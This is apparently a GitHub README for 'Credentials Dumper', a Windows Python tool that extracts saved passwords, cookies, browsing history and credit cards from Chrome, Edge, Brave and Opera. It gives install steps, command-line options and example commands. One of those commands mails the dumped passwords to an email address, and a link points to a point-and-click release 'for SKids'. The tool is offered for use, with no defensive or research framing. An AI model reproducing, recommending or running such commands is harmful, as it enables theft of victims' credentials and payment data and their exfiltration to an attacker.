# Credentials Dumper
A Tool That Display Browsers Credentials on your terminal
## Supported Os:
* Windows Only
## Supported Browsers:
| Supported browsers  | Passwords  | Cookies  | History  |  Credit Cards |
| ------------- | ------------- | ------------- | ------------- | ------------- |
| Opera |  ✅ | ✅  | ✅ | ✅
| Chrome |  ✅ | ✅  | ✅ | ✅
| Microsoft Edge |  ✅ | ✅  | ✅ | ✅
| Brave |  ✅ | ✅  | ✅ | ✅
## Usage:
### Terminal/cmd:
```
git clone https://github.com/SHBBL/Credentials-Dumper.git
pip3 install -r requirements.txt
cd Credentials-Dumper && cd windows
python Credentials_Dumper.py -h
```
#### Options:
```
  -h, --help            show this help message and exit
  -browser , --browser  Browser Name: chrome/msedge/brave/opera
  -get , --get          Get:passwords/cookies/history/creditcards
  -send , --send        Select: passwords/cookies/history/creditcards
  -to , --to            Send: passwords/cookies/history/creditcards to email
```
## Example:
### Dump it on screen:
``
python Credentials_Dumper.py -browser msedge -get passwords
``
#### Output:
![alt text](https://github.com/SHBBL/Credentials-Dumper/blob/main/blob/img.jpg?raw=true)

### Send to email:
``
python Credentials_Dumper.py -browser msedge -send passwords -to example@example.com 
``
#### Output:
Check Your spam or inbox
### GUI:
For SKids go to [RELEASES](https://github.com/SHBBL/Credentials-Dumper/releases/tag/v1.0)
